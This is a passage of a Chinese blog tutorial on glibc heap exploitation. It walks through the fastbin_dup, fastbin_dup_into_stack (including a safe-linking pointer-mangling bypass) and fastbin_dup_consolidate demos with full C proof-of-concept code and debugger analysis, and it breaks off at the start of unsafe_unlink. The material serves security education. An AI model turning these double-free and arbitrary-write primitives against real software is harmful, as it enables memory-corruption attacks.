+</span></span></code></pre></div><p>开头的两个for循环用于填充tcache，tcache的限制更多，我们暂时不接触。如果不填满tcache，我们在free的时候chunk就会被放入tcache，注意接下来使用的是<code>calloc()</code>而不是<code>malloc()</code>，这是因为<code>calloc()</code>不会去从tcache中查找堆块，这样能保证我们操作的chunk全部位于fastbin</p><p>fastbins 可以看成一个栈，使用单链表实现，通过 fastbin->fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，也就有了两个指向同一块内存区域的指针。</p><p>free的顺序需要注意，glibc有以下检查，连续free两次会被视为double-free，中间插入一次对其他chunk的free才能成功。</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230318223822151.png alt=image-20230318223822151></p><h2 id=fastbin_dup_into_stack><strong>fastbin_dup_into_stack</strong>
+<a class=header-anchor href=#fastbin_dup_into_stack></a></h2><p><code>This file extends on fastbin_dup.c by tricking calloc into returning a pointer to a controlled location (in this case, the stack).</code></p><p>这个程序扩展了上一个程序，通过fastbin_dup使malloc返回一个free chunk的地址，再通过修改其fd指针实现伪造出新的free堆块（在栈上），可以实现修改栈上的内容。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;This file extends on fastbin_dup.c by tricking calloc into</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	       <span style=color:#e6db74>&#34;returning a pointer to a controlled location (in this case, the stack).</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr,<span style=color:#e6db74>&#34;Fill up tcache first.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>ptrs[<span style=color:#ae81ff>7</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>		ptrs[i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>free</span>(ptrs[i]);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> stack_var[<span style=color:#ae81ff>2</span>] <span style=color:#a6e22e>__attribute__</span> ((<span style=color:#a6e22e>aligned</span> (<span style=color:#ae81ff>0x10</span>)));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;The address we want calloc() to return is %p.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, stack_var);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Allocating 3 buffers.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>a <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>b <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>c <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;1st calloc(1,8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;2nd calloc(1,8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, b);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;3rd calloc(1,8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, c);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Freeing the first one...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>); <span style=color:#75715e>//First call to free will add a reference to the fastbin
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>free</span>(a);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;If we free %p again, things will crash because %p is at the top of the free list.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a, a);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;So, instead, we&#39;ll free %p.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, b);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(b);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>//Calling free(a) twice renders the program vulnerable to Double Free
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Now, we can free %p again, since it&#39;s not the head of the free list.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(a);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Now the free list has [ %p, %p, %p ]. &#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;We&#39;ll now carry out our attack by modifying data at %p.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a, b, a, a);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>d <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;1st calloc(1,8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, d);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;2nd calloc(1,8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>));
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Now the free list has [ %p ].</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Now, we have access to %p while it remains at the head of the free list.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;so now we are writing a fake free size (in this case, 0x20) to the stack,</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;so that calloc will think there is a free chunk there and agree to</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;return a pointer to it.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	stack_var[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x20</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> ptr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)stack_var;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> addr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) d;
+</span></span><span style=display:flex><span>	<span style=color:#75715e>/*VULNERABILITY*/</span>
+</span></span><span style=display:flex><span>	<span style=color:#f92672>*</span>d <span style=color:#f92672>=</span> (addr <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>^</span> ptr;
+</span></span><span style=display:flex><span>	<span style=color:#75715e>/*VULNERABILITY*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;3rd calloc(1,8): %p, putting the stack address on the free list</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;4th calloc(1,8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, p);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>assert</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)p <span style=color:#f92672>==</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)stack_var <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里我们在free掉a和b之后打下断点，顺便复习一下malloc chunk的结构：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  This struct declaration is misleading (but accurate and necessary).
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  It declares a &#34;view&#34; into memory allowing access to necessary
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  fields at known offsets from a given base. See explanation below.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> malloc_chunk {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  INTERNAL_SIZE_T      prev_size;  <span style=color:#75715e>/* Size of previous chunk (if free).  */</span>
+</span></span><span style=display:flex><span>  INTERNAL_SIZE_T      size;       <span style=color:#75715e>/* Size in bytes, including overhead. */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> fd;         <span style=color:#75715e>/* double links -- used only if free. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> bk;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Only used for large blocks: pointer to next larger size.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> fd_nextsize; <span style=color:#75715e>/* double links -- used only if free. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> bk_nextsize;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>对于64位系统来讲，这个结构体的每个成员都是8字节的，对于fastbin来讲，没有用到后面的两个字段。</p><p>使用heap和fastbin命令查看分配情况，可见在fastbin中有两个空闲的堆块，且大小都是0x20字节，由于fastbin 是使用单链表来维护释放的堆块的，因此即使堆块被free掉，由于只有fd的信息，无法对bk堆块的PREV_INUSE位置0，所以可以看到下图中的size都是0x21</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319114210945.png alt=image-20230319114210945></p><p>查看堆块的内容，依次是prev_size(0), size(0x21), fd(指向前面的堆块), bk(0)。fastbins对于不同大小的堆块有不同的链表维护，因此prev_size位也不需要。</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319115027016.png alt=image-20230319115027016></p><p>这里大家可能会有疑问，<code>0x404390</code>块的fd地址不对啊？不是<code>0x404370</code>而是<code>0x404774</code>啊？这是由于glibc 2.32及以后的Safe Linking机制造成的，fd保存的并不是实际的前一个堆块的地址，而是<code>(malloc_chunk->fd >> PAGE_SHIFT) ^ 目标地址</code>，那么通过计算<code>(0x4043a0 >> 12) ^ 0x404370 </code>我们可以得到<code>0x404774</code>，也就是下面图片中的地址了。另外由于异或运算的特性，我们可以通过再次异或上面公式的前半部分来还原真实地址。</p><p>接下来我们再次free(a)，可以得到以下：</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319123032745.png alt=image-20230319123032745></p><p><code>(0x404380 >> 12 )^ 0x404794</code>可以得到<code>0x404390</code>，也就是上面的情况了，这样我们在fastbin中<code>0x404370</code>堆块便出现了 2 次。</p><p>接下来我们执行了<code>unsigned long *d = calloc(1,8);</code>,然后又调用了一次<code>calloc</code>，此时fastbin中的前两个堆块已被取出，剩下<code>0x404370</code></p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319123342323.png alt=image-20230319123342323></p><p>此时d的值就是<code>0x404380</code>，我们可以修改<code>0x404370</code>堆块的fd指针了，将其指向在栈上伪造的堆块</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319123517572.png alt=image-20230319123517572></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> ptr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>)stack_var;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> addr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) d;
+</span></span><span style=display:flex><span>	<span style=color:#75715e>/*VULNERABILITY*/</span>
+</span></span><span style=display:flex><span>	<span style=color:#f92672>*</span>d <span style=color:#f92672>=</span> (addr <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>^</span> ptr;
+</span></span><span style=display:flex><span>	<span style=color:#75715e>/*VULNERABILITY*/</span>
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319123835383.png alt=image-20230319123835383></p><p>此时调用<code>calloc</code>应当返回<code> &amp;stack_var + 0x10</code></p><hr><h2 id=fastbin_dup_consolidate>fastbin_dup_consolidate
+<a class=header-anchor href=#fastbin_dup_consolidate></a></h2><p>和fastbin_dup类似，不同的是这里在free fastbin中的块之后申请了另外一个larger bin的堆块，导致触发了malloc_consolidate()，从而使p1不再是fastbin的第一个bin，实现了绕过double free检测。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;This is a powerful technique that bypasses the double free check in tcachebin.&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Fill up the tcache list to force the fastbin usage...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>ptr[<span style=color:#ae81ff>7</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>		ptr[i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x40</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>free</span>(ptr[i]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> p1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0x40</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Allocate another chunk of the same size p1=%p </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, p1);
+</span></span><span style=display:flex><span>  	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Freeing p1 will add this chunk to the fastbin list...</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  	<span style=color:#a6e22e>free</span>(p1);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  	<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> p3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x400</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Allocating a tcache-sized chunk (p3=%p)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, p3);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;will trigger the malloc_consolidate and merge</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;the fastbin chunks into the top chunk, thus</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;p1 and p3 are now pointing to the same chunk !</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>assert</span>(p1 <span style=color:#f92672>==</span> p3);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Triggering the double free vulnerability!</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(p1);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>p4 <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x400</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>assert</span>(p4 <span style=color:#f92672>==</span> p3);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The double free added the chunk referenced by p1 </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;to the tcache thus the next similar-size malloc will</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;point to p3: p3=%p, p4=%p</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>,p3, p4);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>第一次free p1时可以看到其被放入了fastbin</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319162117732-1679214079968-2.png alt=image-20230319162117732></p><p>此时查看heap，可见p1与top chunk是相邻的。</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319162207597.png alt=image-20230319162207597></p><p>下面进行malloc操作，p1会与top chunk合并然后被返回，此时p1和p3的内容相同</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319162547552.png alt=image-20230319162547552></p><p>再次free p1，p1会被放入tcache，当再次申请大小接近的内存时，会返回p1（也就是p3），这样就返回了一个已经分配了的堆块。</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319163237988.png alt=image-20230319163237988></p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230319163300167.png alt=image-20230319163300167></p><h2 id=unsafe_unlink>unsafe_unlink
+<a class=header-anchor href=#unsafe_unlink></a></h2><p><code>Exploiting free on a corrupted chunk to get arbitrary write.</code></p><p>这个程序通过free一个伪造的堆块，实现了任意地址写。</p><p>利用条件是我们能够溢出当前堆块来修改其下一个堆块的内容。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint64_t</span> <span style=color:#f92672>*</span>chunk0_ptr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>setbuf</span>(stdout, NULL);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Welcome to unsafe unlink 2.0!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Tested in Ubuntu 20.04 64bit.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> malloc_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x420</span>; <span style=color:#75715e>//we want to be big enough not to use tcache or fastbin
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>int</span> header_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	chunk0_ptr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>) <span style=color:#a6e22e>malloc</span>(malloc_size); <span style=color:#75715e>//chunk0
